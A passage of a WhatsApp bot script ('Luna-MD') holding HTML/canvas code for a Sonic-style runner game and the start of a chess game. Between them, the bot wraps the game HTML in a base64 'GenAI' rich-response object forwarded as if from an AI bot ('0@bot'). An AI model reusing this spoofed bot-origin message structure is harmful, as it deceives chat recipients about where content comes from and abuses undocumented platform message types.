x.fillStyle=Math.sin(frame*.3)>0?'#ffd75e':'#7a5a10';ell(0,-36,3,3);
/* flash kena hit */
if(boss.flash>0){x.globalAlpha=boss.flash/12*.8;x.fillStyle='#fff';ell(0,0,46,26);x.globalAlpha=1}
x.restore();
}
function drawDanger(){
if(bossWarnT<=0)return;
x.fillStyle='rgba(150,10,20,'+(.14+.1*Math.abs(Math.sin(frame*.25)))+')';x.fillRect(0,0,W,H);
hazBar(0);hazBar(H-18);
x.textAlign='center';
var jx=(Math.random()-.5)*3,jy=(Math.random()-.5)*2;
x.font='900 27px Arial';
x.lineWidth=6;x.strokeStyle='rgba(20,0,5,.85)';x.strokeText('⚠ DANGER ⚠',W/2+jx,H/2-14+jy);
var tg=x.createLinearGradient(0,H/2-40,0,H/2-8);tg.addColorStop(0,'#ffb0b8');tg.addColorStop(.5,'#ff2a3c');tg.addColorStop(1,'#a01020');
x.fillStyle=tg;x.fillText('⚠ DANGER ⚠',W/2+jx,H/2-14+jy);
x.font='700 11px Arial';x.fillStyle='#ffd0d6';x.fillText('BOSS MENDEKAT — SIAPKAN DIRI!',W/2,H/2+8);
x.textAlign='left';
}

/* ============ DRAW ============ */
function draw(){
x.setTransform(DPR,0,0,DPR,0,0);
if(shake>0)x.translate((Math.random()-.5)*shake,(Math.random()-.5)*shake*.7);
/* langit */
var sky=x.createLinearGradient(0,0,0,240);
if(boostOn){sky.addColorStop(0,'#141a52');sky.addColorStop(.55,'#4a2a6e');sky.addColorStop(1,'#7a2a5a')}
else{sky.addColorStop(0,'#1f5fc4');sky.addColorStop(.55,'#5db3ec');sky.addColorStop(1,'#bfe8f5')}
x.fillStyle=sky;x.fillRect(0,0,W,H);
/* matahari */
var su=boostOn?30:26;
x.save();x.translate(334,44);x.rotate(frame*.003);
x.strokeStyle=boostOn?'rgba(255,190,120,.18)':'rgba(255,240,150,.16)';x.lineWidth=3;
for(var r3=0;r3<10;r3++){x.rotate(6.283/10);x.beginPath();x.moveTo(su+4,0);x.lineTo(su+18,0);x.stroke()}
x.restore();
var sg=x.createRadialGradient(334,44,4,334,44,su);
sg.addColorStop(0,boostOn?'#ffefd0':'#fff7cf');sg.addColorStop(.6,boostOn?'#ffa04a':'#ffd75e');sg.addColorStop(1,'rgba(255,215,94,0)');
x.fillStyle=sg;x.beginPath();x.arc(334,44,su,0,7);x.fill();
clouds.forEach(function(c){cloudC(c.x,c.y,c.w,.6)});
x.fillStyle='#27506e';x.beginPath();x.moveTo(0,H);
for(var px=0;px<=W;px+=10){var wx2=px+camX*.12;x.lineTo(px,190-Math.sin(wx2*.004)*26-Math.sin(wx2*.011+2)*9)}
x.lineTo(W,H);x.fill();
x.strokeStyle='rgba(255,255,255,.08)';x.lineWidth=3;x.stroke();
clouds2.forEach(function(c){cloudC(c.x,c.y,c.w,.85)});
x.fillStyle='#2f8a5a';x.beginPath();x.moveTo(0,H);
for(px=0;px<=W;px+=10){wx2=px+camX*.3;x.lineTo(px,208-Math.sin(wx2*.004+1)*20-Math.sin(wx2*.011+3)*8)}
x.lineTo(W,H);x.fill();
/* laut */
var wg2=x.createLinearGradient(0,192,0,236);wg2.addColorStop(0,'#4aa8d8');wg2.addColorStop(1,'#1d6fa8');
x.fillStyle=wg2;x.fillRect(0,192,W,60);
x.fillStyle='rgba(230,250,255,.5)';
for(var swx=Math.floor(camX*.2/34)*34;swx<camX*.2+W+34;swx+=34){
if(((swx*2654435761)>>>0)%5<2){x.fillRect(swx-camX*.2,198+((swx*97)%12),5,1.5)}
}
/* palem */
for(var t2=0;t2<4;t2++){var tw=((t2*340-camX*.75)%1400+1400)%1400-80;
if(tw>-60&&tw<464)palm(tw,gy(tw+camX*.75))}
/* tanah */
var dg=x.createLinearGradient(0,230,0,H);dg.addColorStop(0,'#8a5a2b');dg.addColorStop(1,'#4a2c12');
x.fillStyle=dg;x.beginPath();x.moveTo(0,H);
for(px=0;px<=W;px+=8){x.lineTo(px,gy(px+camX))}
x.lineTo(W,H);x.fill();
for(px=0;px<W;px+=16){
var g2b=gy(px+camX);
for(var row=0;row<2;row++){
var chk=(Math.floor((px+camX)/16)+row)%2;
x.fillStyle=chk?'#c89050':'#8a5a2b';
x.fillRect(px,g2b+5+row*7,16,7);
}
}
/* rumput */
var gg=x.createLinearGradient(0,226,0,240);gg.addColorStop(0,'#37b24d');gg.addColorStop(1,'#1f7a33');
x.fillStyle=gg;x.beginPath();x.moveTo(0,H);
for(px=0;px<=W;px+=6){x.lineTo(px,gy(px+camX)-1)}
x.lineTo(W,H);x.lineTo(0,H);x.fill();
x.strokeStyle='#2e9e44';x.lineWidth=1.5;
for(var bw=Math.floor((camX-20)/14)*14;bw<camX+W+20;bw+=14){
var bxx=bw-camX,byy=gy(bw)-1,swy=Math.sin(frame*.06+bw*.05)*2;
x.beginPath();x.moveTo(bxx,byy);x.quadraticCurveTo(bxx+swy,byy-4,bxx+swy*1.4,byy-6);x.stroke();
}
x.fillStyle='#3a2110';
for(var spx=Math.floor((camX-20)/26)*26;spx<camX+W+20;spx+=26){
x.fillRect(spx-camX,gy(spx)+24+(((spx*2654435761)>>>0)%16),2.5,2.5);
}
/* entitas */
var FLC=['#ff8ab5','#ffd75e','#ffffff'];
ents.forEach(function(e2){
var sx=e2.x-camX;if(sx<-60||sx>464)return;
if(e2.t==='flower'){
var fy2=gy(e2.x),sw2=Math.sin(frame*.05+e2.ph)*1.5;
x.strokeStyle='#2f8a5a';x.lineWidth=1.5;x.beginPath();x.moveTo(sx,fy2);x.quadraticCurveTo(sx+sw2,fy2-5,sx+sw2,fy2-9);x.stroke();
x.fillStyle=FLC[e2.col];
for(var p4=0;p4<5;p4++){var pa=p4/5*6.283+e2.ph;ell(sx+sw2+Math.cos(pa)*3,fy2-9+Math.sin(pa)*3,2,2)}
x.fillStyle='#7a4a10';ell(sx+sw2,fy2-9,1.6,1.6);
}else if(e2.t==='bush'){
var byy=gy(e2.x);
x.fillStyle='#256f3a';ell(sx,byy-6,13,8);ell(sx-8,byy-4,8,6);ell(sx+8,byy-4,8,6);
x.fillStyle='#2f9e4f';ell(sx-2,byy-8,8,6);ell(sx+6,byy-6,7,5);
x.fillStyle='#e8455a';ell(sx-6,byy-8,1.5,1.5);ell(sx+4,byy-6,1.5,1.5);ell(sx+9,byy-9,1.5,1.5);
}else if(e2.t==='sign'){
var sy3=gy(e2.x);
x.fillStyle='#8a6a3a';x.fillRect(sx-2,sy3-20,4,20);
rr(sx-22,sy3-32,44,15,3);x.fillStyle='#1f6ed6';x.fill();
x.strokeStyle='#fff';x.lineWidth=1.5;x.stroke();
x.fillStyle='#ffd75e';x.font='900 9px Arial';x.textAlign='center';x.fillText('DASH »',sx,sy3-21);x.textAlign='left';
}else if(e2.t==='ring'&&!e2.got){
var ey=gy(e2.x)+e2.y+Math.sin(frame*.08+e2.ph)*2;
x.fillStyle='rgba(0,0,0,.12)';ell(sx,gy(e2.x)+3,7,2.5);
var w=Math.abs(Math.sin(e2.ph))*10+3;
x.strokeStyle='#c9930a';x.lineWidth=5;x.beginPath();x.ellipse(sx,ey,w,11,0,0,7);x.stroke();
x.strokeStyle='#ffd75e';x.lineWidth=2.5;x.beginPath();x.ellipse(sx,ey,w,11,0,0,7);x.stroke();
x.strokeStyle='rgba(255,255,255,.85)';x.lineWidth=1.5;x.beginPath();x.ellipse(sx,ey,w,11,0,-2.2,-1.2);x.stroke();
if((frame+Math.floor(e2.ph*10))%80<14){
x.fillStyle='#fff';x.save();x.translate(sx+w+3,ey-5);x.rotate(frame*.1);
x.beginPath();x.moveTo(0,-4);x.lineTo(1.2,-1.2);x.lineTo(4,0);x.lineTo(1.2,1.2);x.lineTo(0,4);x.lineTo(-1.2,1.2);x.lineTo(-4,0);x.lineTo(-1.2,-1.2);x.closePath();x.fill();x.restore();
}
}else if(e2.t==='foe'){
var fy=gy(e2.x),bo=Math.sin(frame*.2+e2.ph)*1.5;
x.fillStyle='rgba(0,0,0,.18)';ell(sx,fy+2,13,3.5);
x.fillStyle='#222';ell(sx-7,fy-2,4,4);ell(sx+7,fy-2,4,4);
x.strokeStyle='#555';x.lineWidth=1.2;
x.beginPath();x.moveTo(sx-9,fy-2);x.lineTo(sx-5,fy-2);x.moveTo(sx+5,fy-2);x.lineTo(sx+9,fy-2);x.stroke();
var fg=x.createRadialGradient(sx-3,fy-16+bo,2,sx,fy-12+bo,12);
fg.addColorStop(0,'#ff8a8a');fg.addColorStop(.6,'#d62a2a');fg.addColorStop(1,'#8a1a1a');
x.fillStyle=fg;x.beginPath();x.arc(sx,fy-12+bo,11,0,7);x.fill();
x.fillStyle='#111';x.fillRect(sx-10,fy-16+bo,20,5);
x.fillStyle='#fff';ell(sx-4,fy-13.5+bo,2.6,2);ell(sx+4,fy-13.5+bo,2.6,2);
x.fillStyle='#d61f3e';x.fillRect(sx-7,fy-18.5+bo,5,1.5);x.fillRect(sx+2,fy-18.5+bo,5,1.5);
x.strokeStyle='#555';x.lineWidth=1.5;x.beginPath();x.moveTo(sx,fy-23+bo);x.quadraticCurveTo(sx+3,fy-27+bo,sx,fy-30+bo);x.stroke();
var blink2=Math.sin(frame*.25+e2.ph)>0;
x.fillStyle=blink2?'#ffd75e':'#7a5a10';x.beginPath();x.arc(sx,fy-30+bo,2.5,0,7);x.fill();
if(blink2){x.shadowColor='#ffd75e';x.shadowBlur=6;x.beginPath();x.arc(sx,fy-30+bo,2.5,0,7);x.fill();x.shadowBlur=0}
}else if(e2.t==='spike'){
var sy2=gy(e2.x);
x.save();x.beginPath();x.rect(sx-18,sy2-4,36,6);x.clip();
for(var hz=-2;hz<6;hz++){
x.fillStyle=hz%2?'#ffd75e':'#222';x.save();x.translate(sx-18+hz*9,sy2-4);x.transform(1,0,-.5,1,0,0);x.fillRect(0,0,7,6);x.restore();
}
x.restore();
x.fillStyle='#444';x.fillRect(sx-18,sy2-4,36,1.5);
for(var k2=-1;k2<=1;k2++){
var tx=sx+k2*10,mg2=x.createLinearGradient(0,sy2-17,0,sy2);
mg2.addColorStop(0,'#f2f5fa');mg2.addColorStop(.5,'#c9ccd6');mg2.addColorStop(1,'#8a8e9a');
x.fillStyle=mg2;x.beginPath();x.moveTo(tx-6,sy2);x.lineTo(tx+6,sy2);x.lineTo(tx,sy2-17);x.closePath();x.fill();
x.fillStyle='#fff';ell(tx,sy2-15,1.2,2);
}
}else if(e2.t==='spring'){
var sq2=e2.ph>0?Math.max(0,1-e2.ph):1;e2.ph=Math.max(0,e2.ph-.06);
var py2=gy(e2.x);
x.fillStyle='#333';x.fillRect(sx-12,py2-4,24,4);
x.fillStyle='#d3323c';x.fillRect(sx-11,py2-9+sq2*6,22,6);
x.strokeStyle='#f2f2f7';x.lineWidth=2;
for(var s2=0;s2<3;s2++){x.beginPath();x.moveTo(sx-9,py2-8+sq2*6-s2*2);x.lineTo(sx+9,py2-8+sq2*6-s2*2);x.stroke()}
x.fillStyle='#e04550';x.fillRect(sx-14,py2-22+sq2*10,28,6);
x.fillStyle='#fff';x.fillRect(sx-14,py2-22+sq2*10,28,1.5);
if(sq2>0&&sq2<.6){x.fillStyle='rgba(255,255,255,'+(sq2)+')';x.font='900 10px Arial';x.textAlign='center';x.fillText('↑',sx,py2-26);x.textAlign='left'}
}else if(e2.t==='pad'){
var pz=gy(e2.x);
x.fillStyle='#7a5205';x.fillRect(sx-16,pz-2,32,3);
x.fillStyle='#e09406';x.fillRect(sx-15,pz-9,30,7);
var off2=(frame*2)%14;
x.fillStyle='#ffd75e';
for(var ch=0;ch<3;ch++){
var cxp=sx-13+((ch*11+off2)%33);
if(cxp<sx+12){
x.beginPath();x.moveTo(cxp,pz-9);x.lineTo(cxp+4,pz-5.5);x.lineTo(cxp,pz-2);x.lineTo(cxp+2,pz-5.5);x.closePath();x.fill();
}}
if(!e2.used){x.shadowColor='#ffd75e';x.shadowBlur=8;x.fillStyle='rgba(255,215,94,.25)';x.fillRect(sx-15,pz-9,30,7);x.shadowBlur=0}
}
});
/* ring terlepas */
lostRings.forEach(function(r2){
var sx=r2.x-camX,w2=Math.abs(Math.sin(r2.ph))*9+3;
x.strokeStyle=r2.life<1?'rgba(255,215,94,'+(r2.life)+')':'#ffd75e';x.lineWidth=3;
x.beginPath();x.ellipse(sx,r2.y,w2,10,0,0,7);x.stroke();
});
/* afterimage + api boost */
trail.forEach(function(t4,i4){
x.globalAlpha=.08+.14*(i4/trail.length);x.fillStyle='#58c7ff';
x.beginPath();x.arc(t4.x-camX-(trail.length-i4)*5,t4.y,11,0,7);x.fill();
});
x.globalAlpha=1;
if(boostOn&&state==='play'){
for(var f4=0;f4<3;f4++){
x.globalAlpha=.35-.1*f4;
x.fillStyle=f4===0?'#ff9a3c':(f4===1?'#ffd75e':'#fff');
x.beginPath();x.ellipse(CX-12-f4*5,CY+2+Math.sin(frame*.9+f4)*2,10-f4*2.5,6-f4*1.5,0,0,7);x.fill();
}
x.globalAlpha=1;
}
/* BOSS (di belakang player biar keliatan di-stomp) */
drawBoss();
/* bayangan karakter */
var gch=gy(camX+CX),hh=Math.max(0,(gch-16)-CY);
x.fillStyle='rgba(0,0,0,'+Math.max(0,.28-hh/180)+')';ell(CX,gch+3,Math.max(4,12-hh*.03),3.5);
if(state==='play'||state==='ready')drawChar();
/* TURRET + AIM + BEAM (di atas semua biar jelas) */
drawTurret();
drawAim();
drawBeam();
/* partikel */
parts.forEach(function(p2){x.globalAlpha=Math.max(p2.life,0);x.fillStyle=p2.c;x.fillRect(p2.x-camX,p2.y,p2.s,p2.s)});
x.globalAlpha=1;
dusts.forEach(function(du){x.globalAlpha=du.t*.5;x.fillStyle='#cbb9a2';x.beginPath();x.arc(du.x-camX,du.y,du.r,0,7);x.fill()});
x.globalAlpha=1;
/* streak boost */
if(boostOn){
x.strokeStyle='rgba(255,255,255,.5)';x.lineWidth=2;
for(var s5=0;s5<9;s5++){
var ly3=14+((s5*47+((frame*3)%47))%(H-24));
var lx2=W-((frame*14+s5*83)%460);
x.globalAlpha=.15+.22*((s5%3)/3);
x.beginPath();x.moveTo(lx2,ly3);x.lineTo(lx2-46,ly3);x.stroke();
}
x.globalAlpha=1;
}
x.restore();
/* vignette */
var vg=x.createRadialGradient(W/2,H/2,140,W/2,H/2,290);
vg.addColorStop(0,'rgba(0,0,0,0)');vg.addColorStop(1,boostOn?'rgba(20,0,40,.45)':'rgba(0,10,30,.28)');
x.fillStyle=vg;x.fillRect(0,0,W,H);
/* flash */
if(flash>0){x.fillStyle='rgba(255,80,80,'+(flash*.3)+')';x.fillRect(0,0,W,H)}
if(wflash>0){x.fillStyle='rgba(255,255,255,'+(wflash*.25)+')';x.fillRect(0,0,W,H)}
if(laser&&laser.ph===2){x.fillStyle='rgba(255,60,40,'+(.06+.04*Math.sin(frame*1.2))+')';x.fillRect(0,0,W,H)}
/* DANGER NOTIF */
drawDanger();
/* HUD boost */
var bx=10,by=10;
rr(bx-2,by-2,108,13,5);x.fillStyle='rgba(4,12,30,.65)';x.fill();
x.strokeStyle='rgba(120,200,255,.5)';x.lineWidth=1;x.stroke();
for(var s6=0;s6<10;s6++){
if(s6<boost/10){var mg3=x.createLinearGradient(0,by,0,by+9);mg3.addColorStop(0,'#ffe89a');mg3.addColorStop(1,'#ff9a3c');x.fillStyle=mg3}
else x.fillStyle='rgba(90,130,180,.25)';
x.fillRect(bx+1+s6*10.4,by+1,8.4,7);
}
x.font='bold 8px monospace';
if(boostOn){x.fillStyle='#ffd75e';x.fillText('BOOST!!',bx+Math.sin(frame*.6)*1.5,by+21)}
else if(boost>=25){x.fillStyle='rgba(255,255,255,'+(.55+.45*Math.sin(frame*.25))+')';x.fillText('BOOST READY!',bx,by+21)}
else{x.fillStyle='rgba(255,255,255,.55)';x.fillText('BOOST',bx,by+21)}
x.fillStyle='rgba(255,255,255,.7)';x.textAlign='right';x.fillText('SPD '+(speed+(boostOn?4.5:0)).toFixed(1),W-10,20);x.textAlign='left';
/* HP boss */
if(boss){
for(var hp3=0;hp3<3;hp3++){
x.save();x.translate(W/2-24+hp3*24,36);x.rotate(.7854);
if(hp3<boss.hp){x.fillStyle='#ff2a3c';if(boss.hp===1){x.shadowColor='#ff2a3c';x.shadowBlur=6+Math.sin(frame*.5)*4}}
else x.fillStyle='rgba(255,255,255,.15)';
x.fillRect(-5.5,-5.5,11,11);x.shadowBlur=0;x.restore();
}
x.font='bold 8px monospace';x.fillStyle='rgba(255,176,184,.9)';x.textAlign='center';x.fillText('BOSS',W/2,52);x.textAlign='left';
}
/* popup skor */
pops.forEach(function(p3){
x.globalAlpha=Math.max(0,p3.t);
x.font='900 12px Arial';x.textAlign='center';
var py3=p3.y-(1-p3.t)*16;
x.lineWidth=3;x.strokeStyle='rgba(10,20,50,.7)';x.strokeText(p3.txt,p3.sx,py3);
x.fillStyle=p3.c;x.fillText(p3.txt,p3.sx,py3);
});
x.globalAlpha=1;x.textAlign='left';
/* banner */
if(banner){
var bt=banner.t,k=Math.min(bt*3,1),al=bt>.8?(1-bt)/.2:1,sc=1+(1-k)*.8;
x.save();x.translate(W/2,92);x.scale(sc,sc);x.globalAlpha=al*k;
x.font='900 24px Arial';x.textAlign='center';
x.lineWidth=5;x.strokeStyle='rgba(10,20,50,.8)';x.strokeText(banner.txt,0,0);
var tg3=x.createLinearGradient(0,-20,0,8);tg3.addColorStop(0,'#fff3b0');tg3.addColorStop(.5,'#ffd75e');tg3.addColorStop(1,'#ff9a3c');
x.fillStyle=tg3;x.fillText(banner.txt,0,0);
x.restore();x.globalAlpha=1;x.textAlign='left';
}
/* overlay READY */
if(state==='ready'){
x.fillStyle='rgba(2,8,26,.55)';x.fillRect(0,0,W,H);
x.textAlign='center';
x.font='900 27px Arial';x.lineWidth=6;x.strokeStyle='rgba(8,16,40,.9)';x.strokeText('SONIC DASH',W/2,110);
var tg4=x.createLinearGradient(0,86,0,112);tg4.addColorStop(0,'#bfe9ff');tg4.addColorStop(.55,'#58c7ff');tg4.addColorStop(1,'#2f7fd6');
x.fillStyle=tg4;x.fillText('SONIC DASH',W/2,110);
x.font='700 10px Arial';x.fillStyle='#9fd8ff';x.fillText('RUN · SPIN · BOOST · DODGE LASER',W/2,128);
if(BEST>0){x.font='bold 11px monospace';x.fillStyle='#ffd75e';x.fillText('BEST: '+BEST,W/2,150)}
x.font='900 15px Arial';x.fillStyle='rgba(255,255,255,'+(.55+.45*Math.sin(frame*.09))+')';x.fillText('TAP UNTUK MULAI',W/2,178);
x.font='600 9px Arial';x.fillStyle='#7a9cc8';x.fillText('laser merah kedip cepat = LOMPPT! · 50 ring = BOSS',W/2,198);
x.textAlign='left';
}
/* overlay DEAD */
if(state==='dead'){
x.fillStyle='rgba(2,8,26,.5)';x.fillRect(0,0,W,H);
rr(52,84,300,116,14);x.fillStyle='rgba(8,18,46,.9)';x.fill();
x.strokeStyle='rgba(88,199,255,.45)';x.lineWidth=2;x.stroke();
x.textAlign='center';
x.font='900 25px Arial';
var dg3=x.createLinearGradient(0,100,0,124);dg3.addColorStop(0,'#ff8aa0');dg3.addColorStop(1,'#d61f3e');
x.fillStyle=dg3;x.fillText('GAME OVER',W/2,118);
x.font='bold 12px monospace';x.fillStyle='#eaf2ff';x.fillText('SCORE '+score+'   ·   RINGS '+rings,W/2,144);
if(bestNew){x.fillStyle='rgba(255,215,94,'+(.6+.4*Math.sin(frame*.2))+')';x.font='900 13px Arial';x.fillText('★ NEW BEST: '+best+' ★',W/2,164)}
else{x.fillStyle='#9fd8ff';x.font='bold 12px monospace';x.fillText('BEST: '+best,W/2,164)}
x.font='700 11px Arial';x.fillStyle='rgba(255,255,255,'+(.5+.5*Math.sin(frame*.1))+')';x.fillText('tap untuk main lagi',W/2,188);
x.textAlign='left';
}
}

/* ============ LOOP + AUTO-QUALITY ============ */
var perfA=0,perfN=0,perfDone=false,lastT=0;
function loop(t){
if(!perfDone&&perfN>60&&perfN<160)perfA+=(t-lastT);
if(!perfDone&&perfN===160){perfA/=100;if(perfA>22){DPR=1;cv.width=W;cv.height=H}perfDone=true}
perfN++;lastT=t;
update();draw();requestAnimationFrame(loop);
}
requestAnimationFrame(loop);
})();
</script>`

const data = {
  response_id: "PopiooNixelPopiooNixelPopiooNixel",
  sections: [
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAISingleLayoutViewModel",
        primitive: {
          __typename: "GenAIBotProgressStatusPrimitive",
          title: "KLIK TEKS INI",
          is_in_progress: true
        }
      }
    }
  ],
  embedded_screens: [
    {
      title: "Preview",
      content: [
        {
          __typename: "FOAIDNixelButtonSheets",
          tabs: [
            {
              id: "tab_0",
              tab_header: "Luna-MD",
              sections: [
                {
                  __typename: "GenAIUnifiedResponseSection",
                  view_model: {
                    __typename: "GenAISingleLayoutViewModel",
                    primitive: {
                      __typename: "GenAIaeacdsnwHtmlPrimitive",
                      payload: HTML,
                      url: "https://example.com",
                      trusted_sources: ["example.com"]
                    }
                  }
                }
              ],
              step_entries: []
            }
          ]
        }
      ]
    }
  ]
};

await luna.relayMessage(
  m.chat,
  {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: "",
        richResponseSourcesMetadata: {}
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          unifiedResponse: {
            data: Buffer.from(JSON.stringify(data)).toString('base64')
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: { botJid: "0@bot" },
            forwardOrigin: 4
          }
        }
      }
    }
  },
  {
    messageId: await luna.generateMessageTag()
  }
);
}
break

case "chess": 
case "catur" : {
const HTML = `
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">

<title>Luna-MD Chess</title>

<style>
:root{
  --bg:#08070b;
  --panel:#121017;
  --panel2:#19151f;
  --line:rgba(255,255,255,.09);
  --text:#fff;
  --muted:#aaa1ae;
  --pink:#ff6fae;
  --pink2:#ff9ac7;

  --light:#f2d7b5;
  --dark:#a96f54;

  --selected:#ffd45c;
  --move:rgba(93,255,167,.75);
  --capture:rgba(255,80,110,.9);
  --check:#ff426c;
}

*{
  box-sizing:border-box;
  -webkit-tap-highlight-color:transparent;
}

html,body{
  margin:0;
  padding:0;
  background:
    radial-gradient(circle at top,#21101c 0%,#0b080d 45%,#050407 100%);
  color:var(--text);
  font-family:
    -apple-system,
    BlinkMacSystemFont,
    "Segoe UI",
    Roboto,
    Arial,
    sans-serif;
}

body{
  min-height:100vh;
  padding:12px;
}

.app{
  width:min(100%,760px);
  margin:auto;
}

.header{
  display:flex;
  align-items:center;
  justify-content:space-between;
  gap:10px;
  margin-bottom:12px;
}

.brand{
  display:flex;
  align-items:center;
  gap:10px;
}

.avatar{
  width:46px;
  height:46px;
  border-radius:15px;
  display:flex;
  align-items:center;
  justify-content:center;
  background:
    linear-gradient(135deg,#ff77b4,#9b4dff);
  box-shadow:0 8px 25px rgba(255,90,170,.22);
  font-size:25px;
}

.title{
  font-size:19px;
  font-weight:800;
}

.subtitle{
  color:var(--muted);
  font-size:11px;
  margin-top:2px;
}

.status{
  padding:8px 11px;
  border:1px solid var(--line);
  border-radius:12px;
  background:rgba(255,255,255,.035);
  color:#ddd;
  font-size:11px;
}

.controls{
  display:grid;
  grid-template-columns:1fr 1fr;
  gap:8px;
  margin-bottom:10px;
}

.select,
.btn{
  min-height:42px;
  border-radius:13px;
  border:1px solid var(--line);
  background:rgba(255,255,255,.045);
  color:#fff;
  font-size:13px;
  outline:none;
}

.select{
  padding:0 12px;
}

.btn{
  padding:0 12px;
  font-weight:700;
  cursor:pointer;
}

.btn:active{
  transform:scale(.97);
}

.btn.primary{
  background:linear-gradient(135deg,#ff5fa5,#c457ff);
  border:0;
}

.boardWrap{
  position:relative;
  width:100%;
  max-width:680px;
  margin:auto;
  padding:8px;
  border-radius:22px;
  background:
    linear-gradient(145deg,
      rgba(255,255,255,.10),
      rgba(255,255,255,.025));
  box-shadow:
    0 20px 60px rgba(0,0,0,.45),
    0 0 40px rgba(255,80,160,.08);
}

.board{
  position:relative;
  width:100%;
  aspect-ratio:1;
  display:grid;
  grid-template-columns:repeat(8,1fr);
  overflow:hidden;
  border-radius:15px;
  touch-action:none;
  user-select:none;
}

.square{
  position:relative;
  display:flex;
  align-items:center;
  justify-content:center;
  aspect-ratio:1;
  cursor:pointer;
}

.square.light{
  background:var(--light);
}

.square.dark{
  background:var(--dark);
}

.square.selected{
  box-shadow:inset 0 0 0 4px var(--selected);
}

.square.check{
  background:
    radial-gradient(circle,
      rgba(255,30,80,.95),
      rgba(255,30,80,.35) 55%,
      transparent 75%);
}

.piece{
  position:relative;
  z-index:4;
  font-size:clamp(28px,8vw,61px);
  line-height:1;
  filter:
    drop-shadow(0 3px 2px rgba(0,0,0,.45));
  transition:transform .1s ease;
}

.piece.w {
  color: #ffffff;
}

.piece.b {
  color: #000000;
  filter: drop-shadow(0 3px 2px rgba(255,255,255,.2));
}

.square.selected .piece{
  transform:scale(1.08);
}

.moveDot{
  position:absolute;
  width:22%;
  height:22%;
  border-radius:50%;
  background:var(--move);
  z-index:2;
  box-shadow:0 0 10px rgba(93,255,167,.35);
}

.captureRing{
  position:absolute;
  inset:8%;
  border-radius:50%;
  border:5px solid var(--capture);
  z-index:2;
}

.coord{
  position:absolute;
  font-size:9px;
  font-weight:800;
  opacity:.65;
  pointer-events:none;
}

.file{
  right:4px;
  bottom:2px;
}

.rank{
  left:4px;
  top:2px;
}

.light .coord{
  color:#754c39;
}

.dark .coord{
  color:#f5dcc5;
}

.info{
  display:grid;
  grid-template-columns:1fr 1fr 1fr;
  gap:8px;
  margin-top:10px;
}

.card{
  padding:11px;
  min-height:62px;
  border:1px solid var(--line);
  border-radius:14px;
  background:rgba(255,255,255,.035);
  text-align:center;
}

.card b{
  display:block;
  font-size:15px;
}

.card span{
  color:var(--muted);
  font-size:10px;
}

.captured{
  min-height:38px;
  margin-top:10px;
  padding:9px 12px;
  border:1px solid var(--line);
  border-radius:13px;
  background:rgba(255,255,255,.03);
  color:#ddd;
  font-size:19px;
  word-break:break-word;
}

.message{
  margin-top:10px;
  padding:11px 13px;
  border-radius:13px;
  background:rgba(255,111,174,.07);
  border:1px solid rgba(255,111,174,.14);
  text-align:center;
  color:#ffd5e7;
  font-size:12px;
  min-height:40px;
  display:flex;
  align-items:center;
  justify-content:center;
}

.actions{
  display:grid;
  grid-template-columns:repeat(3,1fr);
  gap:8px;
  margin-top:10px;
}

.overlay{
  position:fixed;
  inset:0;
  z-index:50;
  display:none;
  align-items:center;
  justify-content:center;
  padding:20px;
  background:rgba(0,0,0,.72);
  backdrop-filter:blur(8px);
}

.overlay.show{
  display:flex;
}

.modal{
  width:min(92vw,420px);
  padding:23px;
  border-radius:23px;
  background:
    linear-gradient(145deg,#1c151e,#0f0c12);
  border:1px solid rgba(255,255,255,.10);
  box-shadow:0 25px 80px rgba(0,0,0,.65);
  text-align:center;
}

.modalIcon{
  font-size:55px;
  margin-bottom:7px;
}

.modal h2{
  margin:5px 0;
  font-size:24px;
}

.modal p{
  color:var(--muted);
  font-size:13px;
  margin-bottom:17px;
}

.modeButtons{
  display:grid;
  grid-template-columns:1fr 1fr;
  gap:9px;
}

.modeBtn{
  padding:14px 10px;
  border-radius:14px;
  border:1px solid var(--line);
  background:rgba(255,255,255,.045);
  color:#fff;
  cursor:pointer;
}

.modeBtn strong{
  display:block;
  margin-bottom:3px;
}

.modeBtn small{
  color:var(--muted);
}

.promotion{
  position:fixed;
  inset:0;
  z-index:60;
  display:none;
  align-items:center;
  justify-content:center;
  background:rgba(0,0,0,.68);
}

.promotion.show{
  display:flex;
}

.promoBox{
  padding:18px;
  border-radius:20px;
  background:#171219;
  border:1px solid var(--line);
}

.promoBox h3{
  margin:0 0 12px;
  text-align:center;
}

.promoChoices{
  display:flex;
  gap:8px;
}

.promo{
  width:60px;
  height:60px;
  border:0;
  border-radius:13px;
  background:#29202a;
  color:white;
  font-size:39px;
}

@media(max-width:430px){
  body{
    padding:8px;
  }

  .boardWrap{
    padding:5px;
    border-radius:17px;
  }

  .info{
    gap:5px;
  }

  .card{
    padding:9px 4px;
  }

  .actions{
    grid-template-columns:1fr 1fr 1fr;
  }
}
</style>
</head>

<body>

<div class="app">

  <div class="header">
    <div class="brand">
      <div class="avatar">♟️</div>
      <div>
        <div class="title">Luna-MD Chess ♟️</div>
        <div class="subtitle">noxXza.exe • Luna-MD</div>
      </div>
    </div>

    <div class="status" id="status">White turn</div>
  </div>

  <div class="controls">
    <select id="mode" class="select">
      <option value="easy">🟢 Easy</option>
      <option value="medium" selected>🟡 Medium</option>
      <option value="hard">🔴 Hard</option>
      <option value="master">👑 Master</option>
      <option value="pvp">👥 2 Player</option>
    </select>

    <button class="btn primary" id="newGame">
      ♻️ New Game
    </button>
  </div>

  <div class="boardWrap">
    <div id="board" class="board"></div>
  </div>

  <div class="info">
    <div class="card">
      <b id="turnText">White</b>
      <span>Giliran</span>
    </div>

    <div class="card">
      <b id="moveText">0</b>
      <span>Moves</span>
    </div>

    <div class="card">
      <b id="modeText">Medium</b>
      <span>Mode</span>
    </div>
  </div>

  <div class="captured" id="captured">
    ⚪ —
  </div>

  <div class="message" id="message">
    Pilih bidak untuk mulai bermain ♟️
  </div>

  <div class="actions">
    <button class="btn" id="undo">↩️ Undo</button>
    <button class="btn" id="flip">🔄 Flip</button>
    <button class="btn" id="resign">🏳️ Resign</button>
  </div>

</div>

<div class="overlay" id="overlay">
  <div class="modal">

    <div class="modalIcon" id="resultIcon">🏆</div>

    <h2 id="resultTitle">Checkmate!</h2>

